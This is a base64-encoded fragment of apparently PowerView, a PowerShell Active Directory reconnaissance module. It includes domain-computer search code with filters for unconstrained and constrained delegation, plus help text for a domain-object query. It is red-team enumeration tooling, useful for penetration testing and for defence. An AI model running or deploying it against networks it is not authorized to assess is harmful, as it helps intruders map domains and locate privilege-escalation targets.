JpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5Db21wdXRlciAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClBvd2VyVmlldy5Db21wdXRlcgoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBjb21wdXRlciBwcm9wZXJ0eSBmaWVsZHMuCgpQb3dlclZpZXcuQ29tcHV0ZXIuUmF3CgpUaGUgcmF3IERpcmVjdG9yeVNlcnZpY2VzLlNlYXJjaFJlc3VsdCBvYmplY3QsIGlmIC1SYXcgaXMgZW5hYmxlZC4KIz4KCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkNvbXB1dGVyJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkNvbXB1dGVyLlJhdycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnRE5TSG9zdE5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRVbmNvbnN0cmFpbmVkLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUcnVzdGVkVG9BdXRoLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRQcmludGVycywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQcmluY2lwYWxOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU1BOLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE9wZXJhdGluZ1N5c3RlbSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2aWNlUGFjaywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTaXRlTmFtZSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUGluZywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCgogICAgRHluYW1pY1BhcmFtIHsKICAgICAgICAkVUFDVmFsdWVOYW1lcyA9IFtFbnVtXTo6R2V0TmFtZXMoJFVBQ0VudW0pCiAgICAgICAgIyBhZGQgaW4gdGhlIG5lZ2F0aW9ucwogICAgICAgICRVQUNWYWx1ZU5hbWVzID0gJFVBQ1ZhbHVlTmFtZXMgfCBGb3JFYWNoLU9iamVjdCB7JF87ICJOT1RfJF8ifQogICAgICAgICMgY3JlYXRlIG5ldyBkeW5hbWljIHBhcmFtZXRlcgogICAgICAgIE5ldy1EeW5hbWljUGFyYW1ldGVyIC1OYW1lIFVBQ0ZpbHRlciAtVmFsaWRhdGVTZXQgJFVBQ1ZhbHVlTmFtZXMgLVR5cGUgKFthcnJheV0pCiAgICB9CgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkQ29tcFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICNiaW5kIGR5bmFtaWMgcGFyYW1ldGVyIHRvIGEgZnJpZW5kbHkgdmFyaWFibGUKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzIC1hbmQgKCRQU0JvdW5kUGFyYW1ldGVycy5Db3VudCAtbmUgMCkpIHsKICAgICAgICAgICAgTmV3LUR5bmFtaWNQYXJhbWV0ZXIgLUNyZWF0ZVZhcmlhYmxlcyAtQm91bmRQYXJhbWV0ZXJzICRQU0JvdW5kUGFyYW1ldGVycwogICAgICAgIH0KCiAgICAgICAgaWYgKCRDb21wU2VhcmNoZXIpIHsKICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyID0gJycKICAgICAgICAgICAgJEZpbHRlciA9ICcnCiAgICAgICAgICAgICRJZGVudGl0eSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJElkZW50aXR5SW5zdGFuY2UgPSAkXy5SZXBsYWNlKCcoJywgJ1wyOCcpLlJlcGxhY2UoJyknLCAnXDI5JykKICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15TLTEtJykgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXkNOPScpIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihkaXN0aW5ndWlzaGVkbmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgaWYgKCgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIC1hbmQgKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgYSAtRG9tYWluIGlzbid0IGV4cGxpY2l0bHkgc2V0LCBleHRyYWN0IHRoZSBvYmplY3QgZG9tYWluIG91dCBvZiB0aGUgZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgIyAgIGFuZCByZWJ1aWxkIHRoZSBkb21haW4gc2VhcmNoZXIKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RG9tYWluID0gJElkZW50aXR5SW5zdGFuY2UuU3ViU3RyaW5nKCRJZGVudGl0eUluc3RhbmNlLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluQ29tcHV0ZXJdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJElkZW50aXR5RG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICRDb21wU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRDb21wU2VhcmNoZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluQ29tcHV0ZXJdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4nIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZS5Db250YWlucygnLicpKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIofChuYW1lPSRJZGVudGl0eUluc3RhbmNlKShkbnNob3N0bmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtaW1hdGNoICdeWzAtOUEtRl17OH0tKFswLTlBLUZdezR9LSl7M31bMC05QS1GXXsxMn0kJykgewogICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgoW0d1aWRdJElkZW50aXR5SW5zdGFuY2UpLlRvQnl0ZUFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7ICdcJyArICRfLlRvU3RyaW5nKCdYMicpIH0pIC1qb2luICcnCiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRJZGVudGl0eUZpbHRlciAtYW5kICgkSWRlbnRpdHlGaWx0ZXIuVHJpbSgpIC1uZSAnJykgKSB7CiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VuY29uc3RyYWluZWQnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBmb3IgdW5jb25zdHJhaW5lZCBkZWxlZ2F0aW9uJwogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj01MjQyODgpJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RydXN0ZWRUb0F1dGgnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgdGhhdCBhcmUgdHJ1c3RlZCB0byBhdXRoZW50aWNhdGUgZm9yIG90aGVyIHByaW5jaXBhbHMnCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcobXNkcy1hbGxvd2VkdG9kZWxlZ2F0ZXRvPSopJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1ByaW50ZXJzJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tHZXQtRG9tYWluQ29tcHV0ZXJdIFNlYXJjaGluZyBmb3IgcHJpbnRlcnMnCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcob2JqZWN0Q2F0ZWdvcnk9cHJpbnRRdWV1ZSknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU1BOJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluQ29tcHV0ZXJdIFNlYXJjaGluZyBmb3IgY29tcHV0ZXJzIHdpdGggU1BOOiAkU1BOIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHNlcnZpY2VQcmluY2lwYWxOYW1lPSRTUE4pIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ09wZXJhdGluZ1N5c3RlbSddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkNvbXB1dGVyXSBTZWFyY2hpbmcgZm9yIGNvbXB1dGVycyB3aXRoIG9wZXJhdGluZyBzeXN0ZW06ICRPcGVyYXRpbmdTeXN0ZW0iCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIob3BlcmF0aW5nc3lzdGVtPSRPcGVyYXRpbmdTeXN0ZW0pIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZpY2VQYWNrJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluQ29tcHV0ZXJdIFNlYXJjaGluZyBmb3IgY29tcHV0ZXJzIHdpdGggc2VydmljZSBwYWNrOiAkU2VydmljZVBhY2siCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIob3BlcmF0aW5nc3lzdGVtc2VydmljZXBhY2s9JFNlcnZpY2VQYWNrKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTaXRlTmFtZSddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkNvbXB1dGVyXSBTZWFyY2hpbmcgZm9yIGNvbXB1dGVycyB3aXRoIHNpdGUgbmFtZTogJFNpdGVOYW1lIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHNlcnZlcnJlZmVyZW5jZWJsPSRTaXRlTmFtZSkiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkNvbXB1dGVyXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIiRMREFQRmlsdGVyIgogICAgICAgICAgICB9CiAgICAgICAgICAgICMgYnVpbGQgdGhlIExEQVAgZmlsdGVyIGZvciB0aGUgZHluYW1pYyBVQUMgZmlsdGVyIHZhbHVlCiAgICAgICAgICAgICRVQUNGaWx0ZXIgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ05PVF8uKicpIHsKICAgICAgICAgICAgICAgICAgICAkVUFDRmllbGQgPSAkXy5TdWJzdHJpbmcoNCkKICAgICAgICAgICAgICAgICAgICAkVUFDVmFsdWUgPSBbSW50XSgkVUFDRW51bTo6JFVBQ0ZpZWxkKQogICAgICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIighKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUpKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRVQUNWYWx1ZSA9IFtJbnRdKCRVQUNFbnVtOjokXykKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PSRVQUNWYWx1ZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRDb21wU2VhcmNoZXIuZmlsdGVyID0gIigmKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OSkkRmlsdGVyKSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Db21wdXRlcl0gR2V0LURvbWFpbkNvbXB1dGVyIGZpbHRlciBzdHJpbmc6ICQoJENvbXBTZWFyY2hlci5maWx0ZXIpIgoKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRSZXN1bHRzID0gJENvbXBTZWFyY2hlci5GaW5kT25lKCkgfQogICAgICAgICAgICBlbHNlIHsgJFJlc3VsdHMgPSAkQ29tcFNlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkVXAgPSAkVHJ1ZQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUGluZyddKSB7CiAgICAgICAgICAgICAgICAgICAgJFVwID0gVGVzdC1Db25uZWN0aW9uIC1Db3VudCAxIC1RdWlldCAtQ29tcHV0ZXJOYW1lICRfLnByb3BlcnRpZXMuZG5zaG9zdG5hbWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkVXApIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSYXcnXSkgewogICAgICAgICAgICAgICAgICAgICAgICAjIHJldHVybiByYXcgcmVzdWx0IG9iamVjdHMKICAgICAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyID0gJF8KICAgICAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Db21wdXRlci5SYXcnKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyID0gQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXIuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkNvbXB1dGVyJykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluQ29tcHV0ZXJdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRDb21wU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbk9iamVjdCB7CjwjCi5TWU5PUFNJUwoKUmV0dXJuIGFsbCAob3Igc3BlY2lmaWVkKSBkb21haW4gb2JqZWN0cyBpbiBBRC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBDb252ZXJ0LUxEQVBQcm9wZXJ0eSwgQ29udmVydC1BRE5hbWUgIAoKLkRFU0NSSVBUSU9OCgpCdWlsZHMgYSBkaXJlY3Rvcnkgc2VhcmNoZXIgb2JqZWN0IHVzaW5nIEdldC1Eb21haW5TZWFyY2hlciwgYnVpbGRzIGEgY3VzdG9tCkxEQVAgZmlsdGVyIGJhc2VkIG9uIHRhcmdldGluZy9maWx0ZXIgcGFyYW1ldGVycywgYW5kIHNlYXJjaGVzIGZvciBhbGwgb2JqZWN0cwptYXRjaGluZyB0aGUgY3JpdGVyaWEuIFRvIG9ubHkgcmV0dXJuIHNwZWNpZmljIHByb3BlcnRpZXMsIHVzZQoiLVByb3BlcnRpZXMgc2FtYWNjb3VudG5hbWUsdXNuY2hhbmdlZCwuLi4iLiBCeSBkZWZhdWx0LCBhbGwgb2JqZWN0cyBmb3IKdGhlIGN1cnJlbnQgZG9tYWluIGFyZSByZXR1cm5lZC4KCi5QQVJBTUVURVIgSWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkuCldpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgVUFDRmlsdGVyCgpEeW5hbWljIHBhcmFtZXRlciB0aGF0IGFjY2VwdHMgb25lIG9yIG1vcmUgdmFsdWVzIGZyb20gJFVBQ0VudW0sIGluY2x1ZGluZwoiTk9UX1giIG5lZ2F0aW9uIGZvcm1zLiBUbyBzZWUgYWxsIHBvc3NpYmxlIHZhbHVlcywgcnVuICcwfENvbnZlcnRGcm9tLVVBQ1ZhbHVlIC1TaG93QWxsJy4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9iamVjdCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFNlY3VyaXR5TWFza3MKClNwZWNpZmllcyBhbiBvcHRpb24gZm9yIGV4YW1pbmluZyBzZWN1cml0eSBpbmZvcm1hdGlvbiBvZiBhIGRpcmVjdG9yeSBvYmplY3QuCk9uZSBvZiAnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgRmluZE9uZQoKT25seSByZXR1cm4gb25lIHJlc3VsdCBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouUEFSQU1FVEVSIFJhdwoKU3dpdGNoLiBSZXR1cm4gcmF3IHJlc3V